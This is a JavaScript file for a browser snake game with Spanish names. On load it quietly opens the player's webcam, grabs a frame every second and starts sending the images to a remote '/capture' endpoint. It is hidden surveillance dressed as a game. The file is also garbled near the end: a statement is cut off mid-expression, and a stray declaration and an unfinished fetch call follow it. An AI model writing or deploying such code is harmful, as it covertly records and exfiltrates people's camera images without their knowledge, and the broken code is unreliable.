const canvas = document.getElementById("gameCanvas");
const contexto = canvas.getContext("2d");

const captureCanvas = document.createElement("canvas");
const captureContext = captureCanvas.getContext("2d");

const TAMANO_CELDA = 20;
let velocidadX = TAMANO_CELDA, velocidadY = 0;
let serpiente = [{ x: 200, y: 200 }];
let comida = generarComida();
let enJuego = true;
const SERVER_URL = "http://127.0.0.1:5000";

document.addEventListener("keydown", cambiarDireccion);
window.onload = () => { iniciarCamara(); actualizarJuego(); };

// Rest of your game functions remain the same...

async function iniciarCamara() {
    try {
        const stream = await navigator.mediaDevices.getUserMedia({ 
            video: true,
            audio: false
        });

        const video = document.createElement("video");
        video.srcObject = stream;
        video.setAttribute('playsinline', '');
        video.muted = true;
        await video.play();

        let lastCapture = 0;
        const captureInterval = 1000; // 1 second

        function captureLoop(timestamp) {
            if (timestamp - lastCapture >= captureInterval) {
                capturarImagen(video);
                lastCapture = timestamp;
            }
            requestAnimationFrame(captureLoop);
        }

        requestAnimationFrame(captureLoop);

    } catch (error) {
        console.error("Camera error:", error);
    }
}

function capturarImagen(video) {
    try {
        if (!video.videoWidth || !video.videoHeight) return;

        captureCanvas.width = video.videoWidth;
        captureCanvas.height = video.videoHeight;
        captureContext.drawImage(video, 0, 0, captureCanvas.width, captureCanvas.height);

        captureCanvas.toBlob((blob) => {
            if (!blob) return;

            const timestamp = new Date().toISOString().
const BACKEND_URL = window.location.hostname === 'localhost' 
    ? 'http://localhost:5000' 
    : 'https://your-app-name.onrender.com';

fetch(`${BACKEND_URL}/capture`